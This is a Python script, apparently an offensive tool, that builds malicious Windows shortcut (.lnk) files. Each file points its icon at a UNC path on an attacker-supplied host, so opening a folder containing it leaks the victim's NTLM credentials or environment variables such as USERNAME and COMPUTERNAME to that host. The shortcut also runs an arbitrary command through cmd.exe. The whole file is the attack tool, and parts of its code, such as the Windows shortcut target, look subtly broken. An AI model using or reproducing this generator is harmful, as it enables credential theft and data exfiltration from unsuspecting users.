from __future__ import print_function
import argparse
import os
import random
import sys
import textwrap
from datetime import datetime

# Constants for checking the operating system
IS_WINDOWS = sys.platform.startswith('win')

# Importing necessary modules based on the OS
if IS_WINDOWS:
    import win32com.client
else:
    try:
        import pylnk
    except ImportError:
        print("You must install liblnk's Python bindings for non-Windows machines!")
        sys.exit(1)

# Banners for different languages
BANNERS = {
    "en": """
    ##################################################
    #                                                #
    #     __        __   _                          #
    #     \ \      / /__| | ___ ___  _ __ ___   ___ #
    #      \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \#
    #       \ V  V /  __/ | (_| (_) | | | | | |  __/#
    #        \_/\_/ \___|_|\___\___/|_| |_| |_|\___|#
    #                                                #
    #                  WELCOME                       #
    ##################################################
    """,
    "ru": """
    ##################################################
    #                                                #
    #     __        __   _                          #
    #     \ \      / /__| | ___ ___  _ __ ___   ___ #
    #      \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \#
    #       \ V  V /  __/ | (_| (_) | | | | | |  __/#
    #        \_/\_/ \___|_|\___\___/|_| |_| |_|\___|#
    #                                                #
    #                 ДОБРО ПОЖАЛОВАТЬ               #
    ##################################################
    """,
    "zh": """
    ##################################################
    #                                                #
    #     __        __   _                          #
    #     \ \      / /__| | ___ ___  _ __ ___   ___ #
    #      \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \#
    #       \ V  V /  __/ | (_| (_) | | | | | |  __/#
    #        \_/\_/ \___|_|\___\___/|_| |_| |_|\___|#
    #                                                #
    #                   欢迎                         #
    ##################################################
    """
}

def select_language():
    """
    Prompt the user to select a language.
    """
    parser = argparse.ArgumentParser(description="Select your language")
    parser.add_argument('--lang', choices=['en', 'ru', 'zh'], required=True, help='Choose language: en, ru, zh')
    args, _ = parser.parse_known_args()
    return args.lang

def parse_cmd_line_args(lang):
    """
    Parse command line arguments.
    """
    parser = argparse.ArgumentParser(description='Generate a LNK payload')
    parser.add_argument('--host', required=True, help='Where should we send our data?')
    parser.add_argument('--output', required=True, help='The name of the lnk file')
    parser.add_argument('--execute', default=[r'C:\Windows\explorer.exe .'], nargs='+', help='Command to execute when the shortcut is clicked')
    parser.add_argument('--vars', help='Variables to exfiltrate, e.g., "PATH,COMPUTERNAME,USERNAME,NUMBER_OF_PROCESSORS"')
    parser.add_argument('--type', default='all', choices=('environment', 'ntlm', 'all'), help='Payload type to generate')
    args = parser.parse_args()
    if args.type != 'ntlm' and not args.vars:
        parser.error("You must specify environment variables to exfiltrate using --vars or choose another payload type with --type")
    return args

def generate_icon_path(args):
    """
    Generate the icon path for the LNK file.
    """
    if args.type == 'ntlm':
        return r'\\{host}\Share\{filename}.ico'.format(host=args.host, filename=random.randint(0, 50000))
    else:
        vars_list = args.vars.replace('%', '').split(',')
        path = '_'.join('%{0}%'.format(var) for var in vars_list)
        return r'\\{host}\Share_{path}\{filename}.ico'.format(host=args.host, path=path, filename=random.randint(0, 50000))

def create_shortcut_windows(args, target, icon):
    """
    Create the shortcut for Windows.
    """
    ws = win32com.client.Dispatch('wscript.shell')
    link = ws.CreateShortcut(args.output)
    link.Targetpath = r'C:\Windows\System32'
    link.Arguments = 'cmd.exe /c ' + target
    link.IconLocation = icon
    link.save()

def create_shortcut_non_windows(args, target, icon):
    """
    Create the shortcut for non-Windows systems.
    """
    filepath = os.path.join(os.getcwd(), args.output)
    link = create_pylnk_file(r'C:\Windows\System32\cmd.exe', filepath, target, icon)
    link.save(filepath)
    print(f'File saved to {filepath}')

def create_pylnk_file(target_file, lnk_name, target, icon):
    """
    Helper function to create a .lnk file using pylnk for non-Windows systems.
    """
    lnk = pylnk.create(lnk_name)
    levels = target_file.split('\\')
    elements = [levels[0]]
    for level in levels[1:-1]:
        segment = create_for_path(level, True)
        elements.append(segment)
    segment = create_for_path(levels[-1], False)
    elements.append(segment)
    lnk.shell_item_id_list = pylnk.LinkTargetIDList()
    lnk.shell_item_id_list.items = elements
    lnk.arguments = '/c ' + target
    lnk.target = target
    lnk.icon = icon
    return lnk

def create_for_path(path, isdir):
    """
    Helper function to create a path segment for the .lnk file.
    """
    now = datetime.now()
    return {
        'type': pylnk.TYPE_FOLDER if isdir else pylnk.TYPE_FILE,
        'size': 272896,
        'created': now,
        'accessed': now,
        'modified': now,
        'name': path.split('\\')[0]
    }

def main():
    """
    Main function to create the LNK payload.
    """
    lang = select_language()
    print(BANNERS[lang])
    args = parse_cmd_line_args(lang)
    target = ' '.join(args.execute)
    icon = generate_icon_path(args)
    
    if IS_WINDOWS:
        create_shortcut_windows(args, target, icon)
    else:
        create_shortcut_non_windows(args, target, icon)
    
    print(f'Link created at {args.output} with UNC path {icon}.')

if __name__ == '__main__':
    main()
